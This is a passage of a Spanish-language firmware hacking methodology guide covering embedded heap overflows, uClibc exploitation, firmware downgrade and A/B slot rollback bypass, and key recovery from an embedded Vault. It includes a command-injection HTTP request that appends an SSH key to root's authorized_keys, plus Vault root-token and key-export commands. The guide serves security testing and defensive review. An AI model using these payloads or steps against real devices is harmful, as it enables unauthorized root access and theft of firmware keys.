- Identifica los **estados transitorios** que avanzan automáticamente y las ramas de reintento/error que finalmente restablecen o liberan el estado controlado por el atacante.
- Confirma qué intercambios legítimos del protocolo se requieren para poner el daemon en el estado vulnerable, en lugar de asumir que el handler con errores siempre es accesible.

Para protocolos sensibles al tiempo, la reproducción de paquetes desde un framework de Python puede ser demasiado lenta. Un enfoque más fiable consiste en emular un dispositivo legítimo en hardware real (por ejemplo, un **nRF52840**) con una pila de nivel de fabricante, para poder exponer los **endpoints**, **atributos** y tiempos de commissioning correctos.

### Clase de errores en descargas fragmentadas en daemons embebidos

Una clase recurrente de errores de firmware aparece en las descargas fragmentadas de **blobs/modelos/configuraciones**:<sup>[[8]](#references)</sup>

1. El **primer fragmento** (`offset == 0`) almacena `ctx->total_size` y asigna `malloc(total_size)`.
2. Los fragmentos posteriores solo validan campos **locales al paquete** controlados por el atacante, como `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sin comprobar que no exceda el **tamaño asignado originalmente**.

Esto permite que un atacante envíe:

- Un primer fragmento válido con un tamaño total declarado **pequeño** para forzar una asignación pequeña en el heap.
- Un fragmento posterior con el **offset esperado**, pero con un `chunk_len` mayor.
- Un tamaño local al paquete falsificado que satisface las comprobaciones nuevas y, a la vez, desborda el búfer asignado originalmente.

Cuando la ruta vulnerable está detrás de la lógica de commissioning, la explotación debe incluir suficiente **emulación del dispositivo** para llevar al objetivo al estado esperado de descarga de modelos o blobs antes de enviar los fragmentos malformados.

### Activadores de `free()` controlados por el protocolo

En los daemons embebidos, la forma más sencilla de activar la explotación de metadatos del heap suele ser no «esperar a que se limpien», sino **forzar el propio manejo de errores del protocolo**:<sup>[[8]](#references)</sup>

- Envía fragmentos posteriores malformados para llevar la FSM a estados de **reintento** o **error**.
- Supera el límite de reintentos para que el daemon **restablezca el contexto** y libere el búfer corrupto.
- Usa este `free()` predecible para activar primitivas del asignador antes de que el proceso se bloquee por motivos no relacionados.

Esto resulta especialmente útil contra asignadores **similares a musl/uClibc/dlmalloc** en Linux embebido, donde la corrupción de los metadatos de los chunks puede convertir la lógica de unlink/unbin en una primitiva de escritura. Un patrón estable consiste en corromper un **campo de tamaño** para redirigir el recorrido del asignador a **chunks falsos preparados dentro del búfer desbordado**, en lugar de sobrescribir inmediatamente punteros reales de bins y bloquear el proceso.

## Explotación de binarios y prueba de concepto

Desarrollar un PoC para las vulnerabilidades identificadas requiere un conocimiento profundo de la arquitectura del objetivo y programación en lenguajes de bajo nivel. Las protecciones de runtime de binarios en sistemas embebidos son poco frecuentes, pero, cuando están presentes, puede que se necesiten técnicas como Return Oriented Programming (ROP).

### Notas sobre la explotación de fastbin de uClibc (Linux embebido)

- **Fastbins + consolidación:** uClibc usa fastbins similares a los de glibc. Una asignación grande posterior puede activar `__malloc_consolidate()`, por lo que cualquier chunk falso debe superar las comprobaciones (tamaño válido, `fd = 0` y chunks circundantes considerados «en uso»).<sup>[[6]](#references)</sup>
- **Binarios no PIE bajo ASLR:** si ASLR está habilitado, pero el binario principal es **no PIE**, las direcciones `.data/.bss` dentro del binario son estables. Puedes apuntar a una región que ya se parezca a una cabecera de chunk válida del heap para que una asignación de fastbin recaiga en una **tabla de punteros a funciones**.
- **NUL que detiene el parser:** al parsear JSON, un `\x00` en el payload puede detener el parsing y mantener los bytes posteriores controlados por el atacante para un pivot de stack/cadena ROP.
- **Shellcode mediante `/proc/self/mem`:** una cadena ROP que llame a `open("/proc/self/mem")`, `lseek()` y `write()` puede colocar shellcode ejecutable en un mapeo conocido y saltar a él.

## Sistemas operativos preparados para el análisis de firmware

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) ofrecen entornos preconfigurados para pruebas de seguridad de firmware, equipados con las herramientas necesarias.

## Sistemas operativos preparados para analizar firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro diseñada para ayudarte a realizar evaluaciones de seguridad y pentesting de dispositivos del Internet de las cosas (IoT). Ahorra mucho tiempo al ofrecer un entorno preconfigurado con todas las herramientas necesarias ya cargadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo para pruebas de seguridad embebida basado en Ubuntu 18.04, con herramientas de pruebas de seguridad de firmware preinstaladas.

## Ataques de downgrade de firmware y mecanismos de actualización inseguros

Incluso cuando un fabricante implementa comprobaciones de firma criptográfica para las imágenes de firmware, con frecuencia se omite la **protección contra el rollback de versiones (downgrade)**. Si el bootloader o el cargador de recuperación solo verifica la firma con una clave pública integrada, pero no compara la *versión* (o un contador monótono) de la imagen que se va a instalar, un atacante puede instalar legítimamente un **firmware antiguo y vulnerable que todavía tiene una firma válida** y, así, reintroducir vulnerabilidades corregidas.<sup>[[4]](#references)</sup>

Flujo de ataque típico:

1. **Obtén una imagen antigua firmada**
   * Descárgala del portal público de descargas, CDN o sitio de soporte del fabricante.
   * Extráela de las aplicaciones móviles/de escritorio complementarias (por ejemplo, de `assets/firmware/` dentro de un APK de Android).
   * Consíguela en repositorios de terceros como VirusTotal, archivos de Internet, foros, etc.
2. **Sube o sirve la imagen al dispositivo** a través de cualquier canal de actualización expuesto:
   * Interfaz web, API de la aplicación móvil, USB, TFTP, MQTT, etc.
   * Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *sin autenticación* que aceptan blobs de firmware codificados en Base64, los decodifican en el lado del servidor y activan el modo de recuperación/actualización.
3. Tras el downgrade, explota una vulnerabilidad corregida en una versión más reciente (por ejemplo, un filtro de command injection añadido posteriormente).
4. Opcionalmente, vuelve a instalar la imagen más reciente o desactiva las actualizaciones para evitar que te detecten una vez conseguida la persistencia.

### Ejemplo: command injection tras un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

En el firmware vulnerable (con una versión anterior), el parámetro `md5` se concatena directamente en un comando de shell sin sanitización, lo que permite inyectar comandos arbitrarios (en este caso, habilitar el acceso root mediante claves SSH). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra la reversión de versión hace que la corrección sea inútil.<sup>[[4]](#references)</sup>

### Extracción de firmware de aplicaciones móviles

Muchos proveedores incluyen imágenes completas del firmware en sus aplicaciones móviles complementarias para que la aplicación pueda actualizar el dispositivo por Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX, en rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso el comando `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass de anti-rollback solo en el updater en diseños de slots A/B

Algunos proveedores sí implementan un **ratchet** anti-downgrade, pero solo dentro de la lógica del *updater* (por ejemplo, una rutina UDS sobre CAN, un comando de recuperación o un agente OTA en userspace). Si el **bootloader** luego solo comprueba la firma/CRC de la imagen y confía en la tabla de particiones o en los metadatos del slot, la protección contra rollback todavía se puede eludir.<sup>[[7]](#references)</sup>

Diseño débil típico:

- Los metadatos del firmware contienen un descriptor de versión y un **ratchet de seguridad** / contador monotónico.
- El updater compara el ratchet de la imagen con un valor almacenado en almacenamiento persistente y rechaza imágenes firmadas más antiguas.
- El bootloader **no** analiza ese ratchet y solo verifica el encabezado, el CRC y la firma antes de arrancar el slot seleccionado.
- La activación del slot se almacena por separado en una tabla de particiones o en un contador de generación por slot y **no está vinculada criptográficamente** al digest exacto del firmware validado.

Esto crea una primitiva de **validar una imagen / arrancar otra imagen** en sistemas de doble slot. Si el atacante puede hacer que el updater marque el slot B como destino del próximo arranque con una imagen firmada actual y luego sobrescribir el slot B antes del reinicio, el bootloader aún podría arrancar la imagen degradada porque solo confía en los metadatos del slot ya confirmados.

Patrón de abuso común:

1. Cargar un firmware **firmado actual** en el slot pasivo y ejecutar la rutina normal de validación/cambio para que el diseño marque ese slot como el próximo activo.
2. **No reiniciar todavía**. Volver a ejecutar la rutina de preparación/borrado del slot en la misma sesión.
3. Abusar de un estado de arranque obsoleto o de una lógica obsoleta de selección de slot para que el updater borre el **mismo slot físico** que acaba de promover.
4. Escribir un firmware **más antiguo, pero todavía firmado** en ese slot.
5. Omitir la rutina de validación que aplica el ratchet y reiniciar directamente.
6. El bootloader selecciona el slot promovido, verifica solo la firma/integridad y arranca la imagen antigua.

Qué buscar al aplicar ingeniería inversa a implementaciones de actualización A/B:

- Selección de slot derivada de **indicadores de arranque** que no se actualizan después de un cambio exitoso.
- Una rutina del tipo `prepare_passive_slot()` que borra un slot basándose en un estado obsoleto en lugar del **diseño confirmado actual**.
- Una función del tipo `part_write_layout()` que solo incrementa un **contador de generación** / indicador de activo y no almacena el hash de la imagen validada.
- Comprobaciones del ratchet implementadas en userspace o en el código del updater, pero **no** en las etapas de ROM / bootloader / secure boot.
- Rutinas de borrado o recuperación que dejan el slot marcado como arrancable incluso después de eliminar y reescribir su contenido.

### Lista de verificación para evaluar la lógica de actualización

* ¿El transporte/la autenticación del *endpoint* de actualización están adecuadamente protegidos (TLS + autenticación)?
* ¿El dispositivo compara **números de versión** o un **contador monotónico anti-rollback** antes de flashear?
* ¿La imagen se verifica dentro de una cadena de secure boot (por ejemplo, firmas comprobadas por el código ROM)?
* ¿El **bootloader aplica el mismo ratchet** que el updater, en lugar de solo comprobar la firma/CRC?
* ¿Los metadatos de activación del slot están **vinculados al digest/versión del firmware validado**, o se puede modificar un slot después de promoverlo?
* Tras un cambio de slot exitoso, ¿se fuerza el reinicio del dispositivo o siguen siendo accesibles otras rutinas de actualización/borrado en la misma sesión?
* ¿El código de userland realiza comprobaciones de coherencia adicionales (por ejemplo, mapa de particiones permitido, número de modelo)?
* ¿Los flujos de actualización *parcial* o de *backup* reutilizan la misma lógica de validación?

> 💡 Si falta alguno de los elementos anteriores, es probable que la plataforma sea vulnerable a ataques de rollback.

## Firmware vulnerable para practicar

Para practicar cómo descubrir vulnerabilidades en firmware, utiliza los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperación de claves de descifrado del firmware a partir del estado de KMS/Vault integrado

Cuando una imagen de actualización mezcla pequeños metadatos en texto plano con un blob grande de alta entropía, analiza primero el contenedor antes de probar fuerza bruta:<sup>[[1]](#references)</sup>

- Vuelca los encabezados, offsets y límites de línea con `hexdump`, `xxd`, `strings -tx`, `base64 -d` y `binwalk -E`.
- `Salted__` suele indicar el formato `enc` de OpenSSL: los siguientes 8 bytes son la sal y los bytes restantes son el texto cifrado.
- Un campo Base64 que decodifica exactamente a `256` bytes es una pista sólida de que se trata de un texto cifrado RSA-2048 que envuelve una contraseña aleatoria del firmware o una clave de sesión.
- El material PGP separado en el mismo archivo suele proteger solo la autenticidad; no des por sentado que se utiliza para la confidencialidad.

Si la búsqueda de claves estáticas (`grep`, `strings`, búsquedas PEM/PGP) no da resultado, aplica ingeniería inversa a la **ruta de descifrado operativa** en lugar de limitarte a buscar claves privadas:

- Descompila el updater / binario de gestión y rastrea quién lee el blob cifrado, qué helper/API lo desenvuelve y qué nombre lógico de clave solicita.
- Busca el estado de KMS en el sistema de archivos raíz extraído (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), además de archivos unit y scripts de init.
- Trata los comandos `vault operator unseal ...` en texto plano, las claves de recuperación, los tokens de bootstrap o los scripts locales de auto-unseal de KMS como equivalentes al material de clave privada.

Si el dispositivo incluye el binario original de Vault y el backend de almacenamiento, reproducir ese entorno suele ser más fácil que reimplementar los componentes internos de Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con root en el KMS clonado:

- Haz que las claves transit sean exportables solo dentro del clon aislado: `vault write transit/keys/<name>/config exportable=true`
- Exporta la clave de desenvoltura: `vault read transit/export/encryption-key/<name>`
- Prueba la clave RSA recuperada con el par exacto de padding/hash que usa el KMS. Un fallo al descifrar con PKCS#1 v1.5 y otro con el descifrado OAEP predeterminado **no** demuestran que la clave sea incorrecta; muchos flujos respaldados por Vault usan OAEP con SHA-256, mientras que las bibliotecas comunes usan SHA-1 de forma predeterminada.
- Si el payload empieza con `Salted__`, reproduce exactamente el KDF de OpenSSL del fabricante (`EVP_BytesToKey`, a menudo MD5 en dispositivos heredados) antes de intentar descifrar con AES-CBC.

Esto convierte el «firmware cifrado» en un problema más general: **recuperar las claves operativas del lado del dispositivo y luego reproducir sin conexión los parámetros exactos de desenvoltura + KDF**.

## Formación y certificaciones

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Descifrando firmware con Claude: habilidad de nivel sénior, autonomía de nivel júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodología de pruebas de seguridad de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking práctico de IoT: la guía definitiva para atacar el Internet de las cosas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explotación de zero days en hardware abandonado – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Cómo un dispositivo inteligente de 20 $ me dio acceso a tu hogar](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ahora me ves: ahora estás pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explotación del Tesla Wall Connector desde su conector del puerto de carga - Parte 2: elusión de la protección anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Haz que parpadee: explotación over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS en QEMU Parte 1: desempaquetado](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentación del kernel de Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS en QEMU Parte 2: depuración y corrección](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Contraseñas del BIOS de Dell: el cifrado XOR débil permite recuperarlas desde SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Herramientas para recuperar contraseñas del BIOS de Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
